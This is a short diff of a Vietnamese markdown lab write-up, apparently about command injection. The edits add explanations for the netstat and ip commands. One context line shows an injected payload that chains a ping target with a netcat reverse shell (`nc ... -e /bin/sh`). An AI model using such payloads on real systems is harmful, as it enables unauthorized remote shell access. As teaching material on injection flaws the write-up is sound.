@@ -149,13 +149,13 @@
 
    ![image](https://user-images.githubusercontent.com/101852647/168758609-76e603b5-9150-46f2-bc77-8346ad1666f8.png)
    
- - Tiếp theo chúng ta sử dụng lệnh `netstat -tunpl `để :
+ - Tiếp theo chúng ta sử dụng lệnh `netstat -tunpl `để kiểm tra các kết nối mạng  :
 
    ![image](https://user-images.githubusercontent.com/101852647/168759055-859aaa02-53b5-4553-b052-9fb47f4eb6ef.png)
 
- - Sau đó chúng ta sẽ sử dụng lệnh `ip a` để :
+ - Sau đó chúng ta sẽ kiểm tra địa chỉ ip :
 
-  ![image](https://user-images.githubusercontent.com/101852647/168759247-b45d025b-826e-4359-8e70-d5915b3b9d22.png)
+   ![image](https://user-images.githubusercontent.com/101852647/168759247-b45d025b-826e-4359-8e70-d5915b3b9d22.png)
 
  - Bây giờ chúng ta sẽ thử lệnh `8.8.8.8 && nc 127.0.0.1 1234 -e /bin/sh ` để tạo một trình bao trên máy chủ và kết nối ngược lại với máy chúng ta:
 
